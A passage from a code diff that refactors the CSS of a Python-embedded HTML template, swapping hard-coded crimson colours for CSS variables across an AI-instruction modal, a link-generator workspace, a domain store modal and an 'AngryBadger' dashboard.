-        .ai-section-label { font-size:.69em; font-weight:700; color:#a49498; letter-spacing:.08em; margin-bottom:4px; }
-        .ai-instruction-area { background:#0c0709; border:1px solid #38161b; border-radius:8px; color:#ffffff; font-size:.88em; padding:12px 14px; resize:vertical; outline:none; min-height:100px; font-family:'Segoe UI',sans-serif; line-height:1.6; transition:border-color .15s; width:100%; box-sizing:border-box; }
-        .ai-instruction-area:focus { border-color:#e50914; box-shadow:0 0 0 2px rgba(229,9,20,.2); }
+        .ai-section-label { font-size:.69em; font-weight:700; color:var(--text-secondary); letter-spacing:.08em; margin-bottom:4px; }
+        .ai-instruction-area { background:var(--bg-primary); border:1px solid var(--border-color); border-radius:8px; color:#ffffff; font-size:.88em; padding:12px 14px; resize:vertical; outline:none; min-height:100px; font-family:'Segoe UI',sans-serif; line-height:1.6; transition:border-color .15s; width:100%; box-sizing:border-box; }
+        .ai-instruction-area:focus { border-color:var(--accent-color); box-shadow:0 0 0 2px var(--accent-glow); }
         .ai-instruction-area::placeholder { color:#6e5c61; }
         .ai-opts-row { display:flex; gap:10px; flex-wrap:wrap; }
         .ai-opt-group { display:flex; flex-direction:column; gap:4px; flex:1; min-width:120px; }
-        .ai-select { background:#0c0709; border:1px solid #38161b; border-radius:6px; color:#f0ebed; font-size:.82em; padding:6px 10px; outline:none; cursor:pointer; }
-        .ai-select:focus { border-color:#e50914; }
-        .ai-preview-area { background:#0c0709; border:1px solid #38161b; border-radius:8px; padding:14px; min-height:120px; max-height:280px; overflow-y:auto; font-size:.84em; color:#f0ebed; font-family:'Courier New',monospace; line-height:1.6; white-space:pre-wrap; word-break:break-word; }
-        .ai-preview-area.generating { border-color:#e50914; box-shadow:0 0 0 2px rgba(229,9,20,.15); }
-        .ai-cursor { display:inline-block; width:2px; height:1em; background:#ff4d58; animation:aiCursor .7s infinite; vertical-align:middle; margin-left:1px; }
+        .ai-select { background:var(--bg-primary); border:1px solid var(--border-color); border-radius:6px; color:#f0ebed; font-size:.82em; padding:6px 10px; outline:none; cursor:pointer; }
+        .ai-select:focus { border-color:var(--accent-color); }
+        .ai-preview-area { background:var(--bg-primary); border:1px solid var(--border-color); border-radius:8px; padding:14px; min-height:120px; max-height:280px; overflow-y:auto; font-size:.84em; color:#f0ebed; font-family:'Courier New',monospace; line-height:1.6; white-space:pre-wrap; word-break:break-word; }
+        .ai-preview-area.generating { border-color:var(--accent-color); box-shadow:0 0 0 2px var(--accent-glow); }
+        .ai-cursor { display:inline-block; width:2px; height:1em; background:var(--accent-color); animation:aiCursor .7s infinite; vertical-align:middle; margin-left:1px; }
         @keyframes aiCursor { 0%,100%{opacity:1} 50%{opacity:0} }
-        .ai-modal-footer { padding:12px 20px; border-top:1px solid #38161b; display:flex; gap:10px; align-items:center; }
-        .ai-gen-btn { background:linear-gradient(135deg,#e50914,#b00710); color:white; border:1px solid rgba(255,255,255,0.15); border-radius:8px; font-size:.88em; font-weight:700; padding:8px 20px; cursor:pointer; transition:all .2s; display:flex; align-items:center; gap:8px; box-shadow:0 0 12px rgba(229,9,20,0.3); }
-        .ai-gen-btn:hover { box-shadow:0 0 20px rgba(229,9,20,.6); transform:translateY(-1px); }
-        .ai-gen-btn:disabled { background:#261115; color:#6e5c61; cursor:not-allowed; transform:none; box-shadow:none; border-color:#38161b; }
+        .ai-modal-footer { padding:12px 20px; border-top:1px solid var(--border-color); display:flex; gap:10px; align-items:center; }
+        .ai-gen-btn { background:var(--accent-gradient); color:white; border:1px solid rgba(255,255,255,0.15); border-radius:8px; font-size:.88em; font-weight:700; padding:8px 20px; cursor:pointer; transition:all .2s; display:flex; align-items:center; gap:8px; box-shadow:0 0 12px var(--accent-glow); }
+        .ai-gen-btn:hover { box-shadow:0 0 20px var(--accent-glow-strong); transform:translateY(-1px); }
+        .ai-gen-btn:disabled { background:var(--bg-panel); color:#6e5c61; cursor:not-allowed; transform:none; box-shadow:none; border-color:var(--border-color); }
         .ai-insert-btn { background:transparent; border:1px solid #3fb950; border-radius:8px; color:#3fb950; font-size:.88em; font-weight:700; padding:8px 18px; cursor:pointer; transition:all .15s; }
         .ai-insert-btn:hover { background:#3fb950; color:#0a0709; }
-        .ai-insert-btn:disabled { border-color:#38161b; color:#6e5c61; cursor:not-allowed; }
+        .ai-insert-btn:disabled { border-color:var(--border-color); color:#6e5c61; cursor:not-allowed; }
         .ai-key-hint { font-size:.72em; color:#6e5c61; margin-left:auto; }
         .ai-spinner { width:16px; height:16px; border:2px solid rgba(255,255,255,.3); border-top-color:white; border-radius:50%; animation:spin .6s linear infinite; }
         @keyframes spin { to{transform:rotate(360deg)} }
-        .ai-no-key-banner { background:#261115; border:1px solid #631c25; border-radius:6px; padding:10px 14px; font-size:.8em; color:#ff6b72; }
-        .ai-no-key-banner a { color:#ff8b94; }
+        .ai-no-key-banner { background:var(--bg-panel); border:1px solid var(--border-color); border-radius:6px; padding:10px 14px; font-size:.8em; color:var(--accent-color); }
+        .ai-no-key-banner a { color:var(--accent-color); }
 
         /* ─── LINK GENERATOR OBSIDIAN-CRIMSON WORKSPACE ─── */
-        .lg-container { background: radial-gradient(circle at 50% 0%, #200d12 0%, #0a0608 100%); min-height: 100%; color: #f1ecf7; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px 28px; box-sizing: border-box; overflow-y: auto; }
+        .lg-container { background: radial-gradient(circle at 50% 0%, var(--bg-panel) 0%, var(--bg-primary) 100%); min-height: 100%; color: #f1ecf7; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px 28px; box-sizing: border-box; overflow-y: auto; }
         .lg-top-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
         .lg-top-left { display: flex; align-items: center; gap: 20px; }
         .lg-page-title { font-size: 1.15rem; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 8px; }
         .lg-subnav { display: flex; gap: 8px; align-items: center; }
-        .lg-nav-tab { padding: 6px 14px; border-radius: 6px; font-size: 0.8rem; font-weight: 600; cursor: pointer; background: #160e12; color: #a49498; border: 1px solid #38161b; transition: all 0.15s ease; display: flex; align-items: center; gap: 6px; text-decoration: none; }
-        .lg-nav-tab:hover { color: #ffffff; border-color: #7a1d24; }
-        .lg-nav-tab.active { background: #2b1115; color: #ffffff; border-color: #e50914; box-shadow: 0 0 12px rgba(229, 9, 20, 0.35); }
+        .lg-nav-tab { padding: 6px 14px; border-radius: 6px; font-size: 0.8rem; font-weight: 600; cursor: pointer; background: var(--bg-sidebar); color: var(--text-secondary); border: 1px solid var(--border-color); transition: all 0.15s ease; display: flex; align-items: center; gap: 6px; text-decoration: none; }
+        .lg-nav-tab:hover { color: #ffffff; border-color: var(--accent-color); }
+        .lg-nav-tab.active { background: var(--border-color); color: #ffffff; border-color: var(--accent-color); box-shadow: 0 0 12px var(--accent-glow); }
         .lg-section-title { font-size: 1rem; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 8px; margin-bottom: 12px; }
         .lg-main-split { display: grid; grid-template-columns: 37% 63%; gap: 24px; align-items: start; margin-bottom: 24px; }
         .lg-controls-pane { 
-            background: #140d10; 
-            border: 1px solid #38161b; 
+            background: var(--bg-sidebar); 
+            border: 1px solid var(--border-color); 
             border-radius: 10px; 
             padding: 20px; 
             display: flex; 
@@ -618,36 +748,36 @@ HTML_TEMPLATE = r'''
             box-shadow: 0 4px 20px rgba(0,0,0,0.5);
         }
         .lg-form-group { display: flex; flex-direction: column; gap: 6px; }
-        .lg-label { font-size: 0.72rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: #a49498; }
+        .lg-label { font-size: 0.72rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: var(--text-secondary); }
         .lg-input-wrap { position: relative; display: flex; align-items: center; }
-        .lg-input, .lg-select, .lg-textarea { width: 100%; background: #0c0709; border: 1px solid #38161b; border-radius: 6px; color: #ffffff; padding: 8px 12px; font-size: 0.85rem; font-family: inherit; outline: none; transition: border-color 0.15s; box-sizing: border-box; }
+        .lg-input, .lg-select, .lg-textarea { width: 100%; background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 6px; color: #ffffff; padding: 8px 12px; font-size: 0.85rem; font-family: inherit; outline: none; transition: border-color 0.15s; box-sizing: border-box; }
         .lg-textarea { resize: vertical; min-height: 54px; }
-        .lg-input:focus, .lg-select:focus, .lg-textarea:focus { border-color: #e50914; box-shadow: 0 0 0 1px #e50914; }
-        .lg-input-btn { position: absolute; right: 6px; background: transparent; border: none; color: #a49498; cursor: pointer; font-size: 14px; padding: 4px; border-radius: 4px; }
-        .lg-input-btn:hover { color: #ffffff; background: #2b1115; }
-        .lg-accordion { border: 1px solid #38161b; border-radius: 8px; background: #100b0e; overflow: hidden; margin-top: 4px; }
-        .lg-acc-header { background: #180e12; padding: 11px 14px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; border-bottom: 1px solid #38161b; user-select: none; }
+        .lg-input:focus, .lg-select:focus, .lg-textarea:focus { border-color: var(--accent-color); box-shadow: 0 0 0 1px var(--accent-color); }
+        .lg-input-btn { position: absolute; right: 6px; background: transparent; border: none; color: var(--text-secondary); cursor: pointer; font-size: 14px; padding: 4px; border-radius: 4px; }
+        .lg-input-btn:hover { color: #ffffff; background: var(--border-color); }
+        .lg-accordion { border: 1px solid var(--border-color); border-radius: 8px; background: var(--bg-sidebar); overflow: hidden; margin-top: 4px; }
+        .lg-acc-header { background: var(--bg-panel); padding: 11px 14px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; border-bottom: 1px solid var(--border-color); user-select: none; }
         .lg-acc-title { font-size: 0.78rem; font-weight: 700; letter-spacing: 0.5px; color: #f0ebed; display: flex; align-items: center; gap: 8px; }
         .lg-acc-body { padding: 14px; display: flex; flex-direction: column; gap: 12px; }
         .lg-acc-body.collapsed { display: none; }
-        .lg-subgroup-title { font-size: 0.68rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.7px; color: #a49498; border-bottom: 1px solid #2e1216; padding-bottom: 4px; margin-top: 6px; }
+        .lg-subgroup-title { font-size: 0.68rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.7px; color: var(--text-secondary); border-bottom: 1px solid var(--border-color); padding-bottom: 4px; margin-top: 6px; }
         .lg-row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .lg-row-inline { display: flex; align-items: center; gap: 8px; }
-        .lg-color-box { width: 36px; height: 32px; border-radius: 5px; border: 1px solid #4a181e; cursor: pointer; padding: 0; background: transparent; }
+        .lg-color-box { width: 36px; height: 32px; border-radius: 5px; border: 1px solid var(--border-color); cursor: pointer; padding: 0; background: transparent; }
         .lg-color-box::-webkit-color-swatch-wrapper { padding: 0; }
         .lg-color-box::-webkit-color-swatch { border: none; border-radius: 4px; }
-        .lg-toggle-show { padding: 3px 8px; border-radius: 4px; font-size: 0.68rem; font-weight: 700; background: #261115; color: #ff8b94; border: 1px solid #5a1c22; cursor: pointer; transition: all 0.15s; user-select: none; white-space: nowrap; }
-        .lg-toggle-show.active { background: #4a181e; color: #ffffff; }
-        .lg-toggle-show.hidden-state { background: #120a0d; color: #6e5c61; border-color: #2b1115; }
-        .lg-default-btn { background: #261115; border: 1px solid #5a1c22; color: #d0c2c6; border-radius: 4px; padding: 6px 10px; font-size: 0.68rem; font-weight: 700; cursor: pointer; white-space: nowrap; }
-        .lg-default-btn:hover { color: #fff; background: #3d1419; }
-        .lg-deploy-btn { background: linear-gradient(135deg, #e50914, #b00710); color: #ffffff; border: 1px solid rgba(255,255,255,0.15); border-radius: 8px; padding: 12px 24px; font-size: 0.95rem; font-weight: 700; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; box-shadow: 0 4px 18px rgba(229, 9, 20, 0.45); transition: all 0.15s; width: fit-content; }
-        .lg-deploy-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 24px rgba(229, 9, 20, 0.65); }
-        .lg-reset-link { color: #a49498; font-size: 0.72rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; cursor: pointer; margin-top: 4px; border: none; background: none; padding: 0; text-align: left; }
+        .lg-toggle-show { padding: 3px 8px; border-radius: 4px; font-size: 0.68rem; font-weight: 700; background: var(--bg-panel); color: var(--accent-color); border: 1px solid var(--border-color); cursor: pointer; transition: all 0.15s; user-select: none; white-space: nowrap; }
+        .lg-toggle-show.active { background: var(--border-color); color: #ffffff; }
+        .lg-toggle-show.hidden-state { background: var(--bg-primary); color: #6e5c61; border-color: var(--border-color); }
+        .lg-default-btn { background: var(--bg-panel); border: 1px solid var(--border-color); color: #d0c2c6; border-radius: 4px; padding: 6px 10px; font-size: 0.68rem; font-weight: 700; cursor: pointer; white-space: nowrap; }
+        .lg-default-btn:hover { color: #fff; background: var(--border-color); }
+        .lg-deploy-btn { background: var(--accent-gradient); color: #ffffff; border: 1px solid rgba(255,255,255,0.15); border-radius: 8px; padding: 12px 24px; font-size: 0.95rem; font-weight: 700; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; box-shadow: 0 4px 18px var(--accent-glow); transition: all 0.15s; width: fit-content; }
+        .lg-deploy-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 24px var(--accent-glow-strong); }
+        .lg-reset-link { color: var(--text-secondary); font-size: 0.72rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; cursor: pointer; margin-top: 4px; border: none; background: none; padding: 0; text-align: left; }
         .lg-reset-link:hover { color: #f0ebed; }
         .lg-preview-card { 
-            background: #140d10; 
-            border: 1px solid #38161b; 
+            background: var(--bg-sidebar); 
+            border: 1px solid var(--border-color); 
             border-radius: 10px; 
             padding: 18px; 
             display: flex; 
@@ -661,66 +791,66 @@ HTML_TEMPLATE = r'''
         }
         .lg-preview-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; flex-shrink: 0; }
         .lg-preview-title { font-size: 0.8rem; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 8px; text-transform: uppercase; letter-spacing: 0.6px; }
-        .lg-preview-tabs { display: flex; gap: 4px; background: #0c0709; padding: 3px; border-radius: 6px; border: 1px solid #2e1216; }
-        .lg-preview-tab-btn { background: transparent; border: none; color: #a49498; padding: 5px 12px; font-size: 0.74rem; font-weight: 700; border-radius: 4px; cursor: pointer; transition: all 0.12s; }
-        .lg-preview-tab-btn.active { background: #e50914; color: #ffffff; }
-        .lg-preview-viewport { flex: 1; min-height: 0; background: #0d070a; border-radius: 8px; overflow: hidden; position: relative; box-shadow: inset 0 0 12px rgba(0,0,0,0.5); display: flex; flex-direction: column; }
+        .lg-preview-tabs { display: flex; gap: 4px; background: var(--bg-primary); padding: 3px; border-radius: 6px; border: 1px solid var(--border-color); }
+        .lg-preview-tab-btn { background: transparent; border: none; color: var(--text-secondary); padding: 5px 12px; font-size: 0.74rem; font-weight: 700; border-radius: 4px; cursor: pointer; transition: all 0.12s; }
+        .lg-preview-tab-btn.active { background: var(--accent-color); color: #ffffff; }
+        .lg-preview-viewport { flex: 1; min-height: 0; background: var(--bg-primary); border-radius: 8px; overflow: hidden; position: relative; box-shadow: inset 0 0 12px rgba(0,0,0,0.5); display: flex; flex-direction: column; }
         .lg-preview-iframe { width: 100%; height: 100%; border: none; display: block; flex: 1; overflow: hidden; }
-        .lg-preview-footer-url { margin-top: 10px; text-align: center; font-size: 0.78rem; color: #a49498; font-family: monospace; flex-shrink: 0; }
-        .lg-deployments-box { background: #140d10; border: 1px solid #38161b; border-radius: 10px; padding: 20px; }
+        .lg-preview-footer-url { margin-top: 10px; text-align: center; font-size: 0.78rem; color: var(--text-secondary); font-family: monospace; flex-shrink: 0; }
+        .lg-deployments-box { background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 10px; padding: 20px; }
         .lg-deploy-header-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
         .lg-table { width: 100%; border-collapse: collapse; background: transparent; }
-        .lg-table th { background: #180e12; color: #a49498; font-size: 0.72rem; text-transform: uppercase; font-weight: 700; padding: 10px 14px; border-bottom: 1px solid #38161b; }
-        .lg-table td { padding: 12px 14px; border-bottom: 1px solid #261115; font-size: 0.82rem; color: #f0ebed; background: transparent; }
-        .lg-table tr:hover td { background: rgba(229, 9, 20, 0.08); }
+        .lg-table th { background: var(--bg-panel); color: var(--text-secondary); font-size: 0.72rem; text-transform: uppercase; font-weight: 700; padding: 10px 14px; border-bottom: 1px solid var(--border-color); }
+        .lg-table td { padding: 12px 14px; border-bottom: 1px solid var(--border-color); font-size: 0.82rem; color: #f0ebed; background: transparent; }
+        .lg-table tr:hover td { background: var(--border-color); }
         .lg-pill-green { background: #064e3b; color: #34d399; border: 1px solid #059669; padding: 3px 8px; border-radius: 12px; font-size: 0.7rem; font-weight: 700; }
-        .lg-link-txt { color: #ff6b72; text-decoration: none; font-family: monospace; font-size: 0.82rem; }
+        .lg-link-txt { color: var(--accent-color); text-decoration: none; font-family: monospace; font-size: 0.82rem; }
         .lg-link-txt:hover { text-decoration: underline; color: #ffffff; }
-        .lg-icon-btn { background: transparent; border: 1px solid #38161b; color: #d0c2c6; border-radius: 4px; padding: 4px 8px; cursor: pointer; font-size: 13px; margin-right: 4px; }
-        .lg-icon-btn:hover { color: #fff; background: #261115; }
-        .lg-mode-capsule { display: inline-flex; background: #0c0709; border: 1px solid #38161b; border-radius: 20px; padding: 2px 4px; gap: 4px; align-items: center; }
-        .lg-mode-btn { width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.72rem; font-weight: 700; color: #a49498; cursor: pointer; transition: all 0.15s; user-select: none; }
-        .lg-mode-btn:hover { color: #ffffff; background: #261115; }
-        .lg-mode-btn.active { background: #e50914; color: #ffffff; box-shadow: 0 0 10px rgba(229, 9, 20, 0.6); }
+        .lg-icon-btn { background: transparent; border: 1px solid var(--border-color); color: #d0c2c6; border-radius: 4px; padding: 4px 8px; cursor: pointer; font-size: 13px; margin-right: 4px; }
+        .lg-icon-btn:hover { color: #fff; background: var(--border-color); }
+        .lg-mode-capsule { display: inline-flex; background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 20px; padding: 2px 4px; gap: 4px; align-items: center; }
+        .lg-mode-btn { width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.72rem; font-weight: 700; color: var(--text-secondary); cursor: pointer; transition: all 0.15s; user-select: none; }
+        .lg-mode-btn:hover { color: #ffffff; background: var(--border-color); }
+        .lg-mode-btn.active { background: var(--accent-color); color: #ffffff; box-shadow: 0 0 10px var(--accent-glow); }
         .lg-switch { position: relative; display: inline-block; width: 44px; height: 22px; }
         .lg-switch input { opacity: 0; width: 0; height: 0; }
-        .lg-slider { position: absolute; cursor: pointer; inset: 0; background-color: #261115; border: 1px solid #5a1c22; transition: .2s; border-radius: 22px; }
+        .lg-slider { position: absolute; cursor: pointer; inset: 0; background-color: var(--bg-panel); border: 1px solid var(--border-color); transition: .2s; border-radius: 22px; }
         .lg-slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 2px; background-color: #fff; transition: .2s; border-radius: 50%; }
-        .lg-switch input:checked + .lg-slider { background-color: #e50914; border-color: #ff3b45; }
+        .lg-switch input:checked + .lg-slider { background-color: var(--accent-color); border-color: var(--accent-hover); }
         .lg-switch input:checked + .lg-slider:before { transform: translateX(20px); }
-        .lg-editor-box { background: #140d10; border: 1px solid #38161b; border-radius: 8px; padding: 14px; display: flex; flex-direction: column; gap: 11px; margin-bottom: 12px; }
+        .lg-editor-box { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px; display: flex; flex-direction: column; gap: 11px; margin-bottom: 12px; }
         .lg-box-title { font-size: 0.72rem; font-weight: 800; color: #f0ebed; text-transform: uppercase; letter-spacing: 0.6px; display: flex; justify-content: space-between; align-items: center; }
-        .lg-hint-text { font-size: 0.7rem; color: #a49498; line-height: 1.45; }
-        .lg-subheading { font-size: 0.68rem; font-weight: 800; color: #a49498; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 4px; margin-bottom: 2px; }
+        .lg-hint-text { font-size: 0.7rem; color: var(--text-secondary); line-height: 1.45; }
+        .lg-subheading { font-size: 0.68rem; font-weight: 800; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px; margin-top: 4px; margin-bottom: 2px; }
 
         /* ── Domain Store & Manager Modal Styles ── */
-        .dm-modal { background: #140d10; border: 1px solid #38161b; border-radius: 12px; color: #f0ebed; box-shadow: 0 10px 40px rgba(0,0,0,0.7); max-width: 840px; width: 95%; max-height: 85vh; display: flex; flex-direction: column; overflow: hidden; padding: 0; }
-        .dm-header { background: #180e12; border-bottom: 1px solid #38161b; padding: 16px 22px; display: flex; align-items: center; justify-content: space-between; }
+        .dm-modal { background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 12px; color: #f0ebed; box-shadow: 0 10px 40px rgba(0,0,0,0.7); max-width: 840px; width: 95%; max-height: 85vh; display: flex; flex-direction: column; overflow: hidden; padding: 0; }
+        .dm-header { background: var(--bg-panel); border-bottom: 1px solid var(--border-color); padding: 16px 22px; display: flex; align-items: center; justify-content: space-between; }
         .dm-title { font-size: 1.05rem; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 10px; }
-        .dm-tabs { display: flex; gap: 6px; background: #0c0709; border-bottom: 1px solid #2e1216; padding: 8px 22px; }
-        .dm-tab-btn { background: transparent; border: none; color: #a49498; font-size: 0.8rem; font-weight: 700; padding: 7px 14px; border-radius: 6px; cursor: pointer; transition: all 0.15s; }
-        .dm-tab-btn:hover { color: #ffffff; background: #261115; }
-        .dm-tab-btn.active { background: #3d1419; color: #ffffff; box-shadow: 0 0 10px rgba(229, 9, 20, 0.35); }
+        .dm-tabs { display: flex; gap: 6px; background: var(--bg-primary); border-bottom: 1px solid var(--border-color); padding: 8px 22px; }
+        .dm-tab-btn { background: transparent; border: none; color: var(--text-secondary); font-size: 0.8rem; font-weight: 700; padding: 7px 14px; border-radius: 6px; cursor: pointer; transition: all 0.15s; }
+        .dm-tab-btn:hover { color: #ffffff; background: var(--border-color); }
+        .dm-tab-btn.active { background: var(--border-color); color: #ffffff; border-color: var(--accent-color); box-shadow: 0 0 10px var(--accent-glow); }
         .dm-body { padding: 22px; overflow-y: auto; flex: 1; display: flex; flex-direction: column; gap: 16px; }
         .dm-search-bar { display: flex; gap: 10px; }
-        .dm-input { flex: 1; background: #0c0709; border: 1px solid #38161b; border-radius: 7px; color: #ffffff; padding: 10px 14px; font-size: 0.9rem; outline: none; }
-        .dm-input:focus { border-color: #e50914; box-shadow: 0 0 0 1px #e50914; }
-        .dm-btn { background: linear-gradient(135deg, #e50914, #b00710); color: #fff; border: 1px solid rgba(255,255,255,0.15); border-radius: 7px; padding: 10px 18px; font-weight: 700; font-size: 0.85rem; cursor: pointer; transition: all 0.15s; display: inline-flex; align-items: center; gap: 6px; }
-        .dm-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 16px rgba(229, 9, 20, 0.5); }
-        .dm-btn-secondary { background: #261115; border: 1px solid #5a1c22; color: #d0c2c6; }
-        .dm-btn-secondary:hover { background: #3d1419; color: #fff; }
+        .dm-input { flex: 1; background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 7px; color: #ffffff; padding: 10px 14px; font-size: 0.9rem; outline: none; }
+        .dm-input:focus { border-color: var(--accent-color); box-shadow: 0 0 0 1px var(--accent-color); }
+        .dm-btn { background: var(--accent-gradient); color: #fff; border: 1px solid rgba(255,255,255,0.15); border-radius: 7px; padding: 10px 18px; font-weight: 700; font-size: 0.85rem; cursor: pointer; transition: all 0.15s; display: inline-flex; align-items: center; gap: 6px; }
+        .dm-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 16px var(--accent-glow); }
+        .dm-btn-secondary { background: var(--bg-panel); border: 1px solid var(--border-color); color: #d0c2c6; }
+        .dm-btn-secondary:hover { background: var(--border-color); color: #fff; }
         .dm-tld-chips { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
-        .dm-tld-chip { font-size: 0.75rem; background: #160e12; border: 1px solid #38161b; padding: 4px 10px; border-radius: 5px; color: #d0c2c6; cursor: pointer; user-select: none; display: flex; align-items: center; gap: 5px; }
-        .dm-tld-chip input { accent-color: #e50914; }
+        .dm-tld-chip { font-size: 0.75rem; background: var(--bg-panel); border: 1px solid var(--border-color); padding: 4px 10px; border-radius: 5px; color: #d0c2c6; cursor: pointer; user-select: none; display: flex; align-items: center; gap: 5px; }
+        .dm-tld-chip input { accent-color: var(--accent-color); }
         .dm-results-table { width: 100%; border-collapse: collapse; margin-top: 6px; }
-        .dm-results-table th { background: #180e12; color: #a49498; font-size: 0.72rem; text-transform: uppercase; font-weight: 700; padding: 10px 14px; border-bottom: 1px solid #38161b; text-align: left; }
-        .dm-results-table td { padding: 12px 14px; border-bottom: 1px solid #261115; font-size: 0.85rem; color: #f0ebed; }
+        .dm-results-table th { background: var(--bg-panel); color: var(--text-secondary); font-size: 0.72rem; text-transform: uppercase; font-weight: 700; padding: 10px 14px; border-bottom: 1px solid var(--border-color); text-align: left; }
+        .dm-results-table td { padding: 12px 14px; border-bottom: 1px solid var(--border-color); font-size: 0.85rem; color: #f0ebed; }
         .dm-badge-avail { background: #064e3b; color: #34d399; border: 1px solid #059669; padding: 3px 8px; border-radius: 12px; font-size: 0.72rem; font-weight: 700; }
         .dm-badge-taken { background: #374151; color: #9ca3af; border: 1px solid #4b5563; padding: 3px 8px; border-radius: 12px; font-size: 0.72rem; font-weight: 700; }
-        .dm-price-tag { font-weight: 700; color: #ff6b72; font-family: monospace; font-size: 0.9rem; }
+        .dm-price-tag { font-weight: 700; color: var(--accent-color); font-family: monospace; font-size: 0.9rem; }
 
         /* ── AngryBadger Dashboard & Table Overhaul (Crimson Paw Theme) ─── */
-        .ab-dashboard-container { width: 100%; height: 100%; overflow-y: auto; background: #0a0608; padding: 22px 28px 40px; box-sizing: border-box; display: flex; flex-direction: column; }
+        .ab-dashboard-container { width: 100%; height: 100%; overflow-y: auto; background: var(--bg-primary); padding: 22px 28px 40px; box-sizing: border-box; display: flex; flex-direction: column; }
         
         /* Top Greeting & Header Bar */
         .ab-top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 22px; flex-shrink: 0; }
@@ -728,26 +858,30 @@ HTML_TEMPLATE = r'''
         .ab-welcome-sub { font-size: 10.5px; font-weight: 700; color: #a49498; letter-spacing: 0.14em; text-transform: uppercase; }
         .ab-welcome-title { font-size: 22px; font-weight: 800; color: #ffffff; letter-spacing: -0.3px; margin: 0; }
         .ab-top-actions { display: flex; align-items: center; gap: 14px; }
-        .ab-reset-stats-btn { display: inline-flex; align-items: center; gap: 7px; height: 36px; padding: 0 14px; background: #161014; border: 1px solid #38161b; border-radius: 8px; color: #cbd5e1; font-size: 11.5px; font-weight: 700; cursor: pointer; transition: all 0.18s ease; outline: none; letter-spacing: 0.04em; text-transform: uppercase; }
-        .ab-reset-stats-btn:hover { background: #261115; border-color: #e50914; color: #ffffff; box-shadow: 0 0 14px rgba(229, 9, 20, 0.35); transform: translateY(-1px); }
+        .ab-reset-stats-btn { display: inline-flex; align-items: center; gap: 7px; height: 36px; padding: 0 14px; background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; color: #cbd5e1; font-size: 11.5px; font-weight: 700; cursor: pointer; transition: all 0.18s ease; outline: none; letter-spacing: 0.04em; text-transform: uppercase; }
+        .ab-reset-stats-btn:hover { background: var(--bg-sidebar); border-color: var(--accent-color); color: #ffffff; box-shadow: 0 0 14px var(--accent-glow); transform: translateY(-1px); }
         .ab-reset-stats-btn:active { transform: translateY(0); }
         .ab-reset-stats-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-        .ab-icon-btn { width: 38px; height: 38px; border-radius: 50%; background: #161014; border: 1px solid #38161b; color: #cbd5e1; display: flex; align-items: center; justify-content: center; cursor: pointer; position: relative; transition: all 0.15s; outline: none; }
-        .ab-icon-btn:hover { background: #261115; border-color: #e50914; color: #ffffff; box-shadow: 0 0 14px rgba(229, 9, 20, 0.4); }
-        .ab-notif-badge { position: absolute; top: -3px; right: -3px; background: #e50914; color: #ffffff; border-radius: 10px; font-size: 10px; font-weight: 800; padding: 1px 5px; min-width: 14px; text-align: center; border: 2px solid #0a0608; }
+        .ab-icon-btn { width: 38px; height: 38px; border-radius: 50%; background: var(--bg-panel); border: 1px solid var(--border-color); color: #cbd5e1; display: flex; align-items: center; justify-content: center; cursor: pointer; position: relative; transition: all 0.15s; outline: none; }
+        .ab-icon-btn:hover { background: var(--bg-sidebar); border-color: var(--accent-color); color: #ffffff; box-shadow: 0 0 14px var(--accent-glow); }
+        .ab-notif-badge { position: absolute; top: -3px; right: -3px; background: var(--accent-color); color: #ffffff; border-radius: 10px; font-size: 10px; font-weight: 800; padding: 1px 5px; min-width: 14px; text-align: center; border: 2px solid var(--bg-primary); }
         
-        .ab-notif-dropdown { position: absolute; top: 48px; right: 0; width: 350px; max-width: 90vw; background: #120b0e; border: 1px solid #38161b; border-radius: 10px; box-shadow: 0 10px 36px rgba(0,0,0,0.8); z-index: 1000; overflow: hidden; }
-        .ab-notif-hdr { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; border-bottom: 1px solid #261115; font-size: 13px; font-weight: 700; color: #ffffff; }
-        .ab-notif-clear { font-size: 11px; color: #ff6b72; cursor: pointer; }
-        .ab-notif-clear:hover { color: #ffffff; }
-        .ab-notif-list { max-height: 320px; overflow-y: auto; overflow-x: hidden; }
-        .ab-notif-empty { padding: 20px; text-align: center; color: #a49498; font-size: 12px; }
